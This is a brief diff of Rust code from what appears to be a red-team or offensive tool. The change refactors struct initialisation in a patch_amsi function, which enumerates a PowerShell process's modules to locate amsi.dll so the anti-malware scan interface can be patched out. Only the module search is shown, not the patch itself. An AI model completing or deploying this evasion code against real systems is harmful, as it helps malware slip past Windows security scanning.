@@ -8,7 +8,7 @@ use regex::Regex;
 use std::error::Error;
 use std::ffi::c_void;
 use std::io::{BufReader, Read, Write};
-use std::mem::MaybeUninit;
+//use std::mem::MaybeUninit;
 use std::process::Child;
 use std::sync::mpsc::{Receiver, Sender, TryRecvError};
 use std::thread;
@@ -239,7 +239,7 @@ pub fn patch_amsi(pid: u32, syscalls_value: bool) {
         let snap_handle = CreateToolhelp32Snapshot(TH32CS_SNAPALL, pid);
 
         // Initialization
-        let mut first_mod = MaybeUninit::<MODULEENTRY32>::uninit().assume_init();
+        let mut first_mod: MODULEENTRY32 = std::mem::zeroed();
         first_mod.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
         Module32First(snap_handle, &mut first_mod as *mut MODULEENTRY32);
         let _modulname = string_from_array(
@@ -255,7 +255,7 @@ pub fn patch_amsi(pid: u32, syscalls_value: bool) {
         // Search for the amsi.dll module in the PowerShell process memory
         let mut amsiaddr: isize = 0;
         loop {
-            let mut next_mod = MaybeUninit::<MODULEENTRY32>::uninit().assume_init();
+            let mut next_mod: MODULEENTRY32 = std::mem::zeroed();
             next_mod.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
             let res_next = Module32Next(snap_handle, &mut next_mod as *mut MODULEENTRY32);
             let next_module = string_from_array(
